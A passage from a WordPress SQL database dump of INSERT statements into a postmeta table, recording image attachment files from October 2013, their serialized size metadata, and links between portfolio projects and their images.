INSERT INTO `cmrfu_postmeta` VALUES("1651","828","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:13:\"2013/10/5.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:13:\"5-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:13:\"5-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:13:\"5-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:13:\"5-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:13:\"5-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:11:\"5-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1652","829","_wp_attached_file","2013/10/6.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1653","829","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:13:\"2013/10/6.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:13:\"6-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:13:\"6-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:13:\"6-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:13:\"6-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:13:\"6-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:11:\"6-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1654","830","_wp_attached_file","2013/10/7.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1655","830","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:13:\"2013/10/7.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:13:\"7-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:13:\"7-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:13:\"7-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:13:\"7-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:13:\"7-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:11:\"7-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1656","831","_wp_attached_file","2013/10/8.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1657","831","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:13:\"2013/10/8.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:13:\"8-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:13:\"8-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:13:\"8-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:13:\"8-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:13:\"8-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:11:\"8-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1658","832","_wp_attached_file","2013/10/91.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1659","832","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/91.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"91-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"91-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"91-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"91-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"91-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"91-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1660","833","_wp_attached_file","2013/10/10.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1661","833","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/10.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"10-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"10-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"10-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"10-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"10-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"10-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1662","186","er_leaf_project_images","824");
INSERT INTO `cmrfu_postmeta` VALUES("1663","186","er_leaf_project_images","825");
INSERT INTO `cmrfu_postmeta` VALUES("1664","186","er_leaf_project_images","826");
INSERT INTO `cmrfu_postmeta` VALUES("1665","186","er_leaf_project_images","827");
INSERT INTO `cmrfu_postmeta` VALUES("1666","186","er_leaf_project_images","832");
INSERT INTO `cmrfu_postmeta` VALUES("1667","186","_wp_old_slug","happy-house");
INSERT INTO `cmrfu_postmeta` VALUES("1676","839","_wp_attached_file","2013/10/New_11.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1677","839","_wp_attachment_metadata","a:5:{s:5:\"width\";i:450;s:6:\"height\";i:600;s:4:\"file\";s:18:\"2013/10/New_11.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:18:\"New_11-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:18:\"New_11-225x300.jpg\";s:5:\"width\";i:225;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:18:\"New_11-450x230.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:18:\"New_11-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:18:\"New_11-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:16:\"New_11-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1678","840","_wp_attached_file","2013/10/New_2.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1679","840","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:17:\"2013/10/New_2.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:17:\"New_2-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:17:\"New_2-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:17:\"New_2-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:17:\"New_2-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:17:\"New_2-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:15:\"New_2-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1680","841","_wp_attached_file","2013/10/New_3.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1681","841","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:17:\"2013/10/New_3.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:17:\"New_3-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:17:\"New_3-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:17:\"New_3-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:17:\"New_3-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:17:\"New_3-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:15:\"New_3-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1682","842","_wp_attached_file","2013/10/New_4.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1683","842","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:17:\"2013/10/New_4.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:17:\"New_4-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:17:\"New_4-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:17:\"New_4-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:17:\"New_4-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:17:\"New_4-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:15:\"New_4-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1684","843","_wp_attached_file","2013/10/New_5.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1685","843","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:17:\"2013/10/New_5.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:17:\"New_5-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:17:\"New_5-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:17:\"New_5-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:17:\"New_5-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:17:\"New_5-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:15:\"New_5-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1686","844","_wp_attached_file","2013/10/New_6.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1687","844","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:17:\"2013/10/New_6.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:17:\"New_6-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:17:\"New_6-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:17:\"New_6-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:17:\"New_6-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:17:\"New_6-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:15:\"New_6-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1688","845","_wp_attached_file","2013/10/New_7.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1689","845","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:17:\"2013/10/New_7.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:17:\"New_7-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:17:\"New_7-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:17:\"New_7-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:17:\"New_7-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:17:\"New_7-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:15:\"New_7-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1690","846","_wp_attached_file","2013/10/New_8.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1691","846","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:17:\"2013/10/New_8.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:17:\"New_8-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:17:\"New_8-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:17:\"New_8-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:17:\"New_8-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:17:\"New_8-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:15:\"New_8-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1692","847","_wp_attached_file","2013/10/New_9.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1693","847","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:17:\"2013/10/New_9.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:17:\"New_9-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:17:\"New_9-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:17:\"New_9-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:17:\"New_9-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:17:\"New_9-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:15:\"New_9-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1694","184","er_leaf_project_images","839");
INSERT INTO `cmrfu_postmeta` VALUES("1695","184","er_leaf_project_images","840");
INSERT INTO `cmrfu_postmeta` VALUES("1696","184","er_leaf_project_images","841");
INSERT INTO `cmrfu_postmeta` VALUES("1697","184","er_leaf_project_images","842");
INSERT INTO `cmrfu_postmeta` VALUES("1698","184","_wp_old_slug","facilisis-laoreet");
INSERT INTO `cmrfu_postmeta` VALUES("1702","850","_wp_attached_file","2013/10/11.jpg");
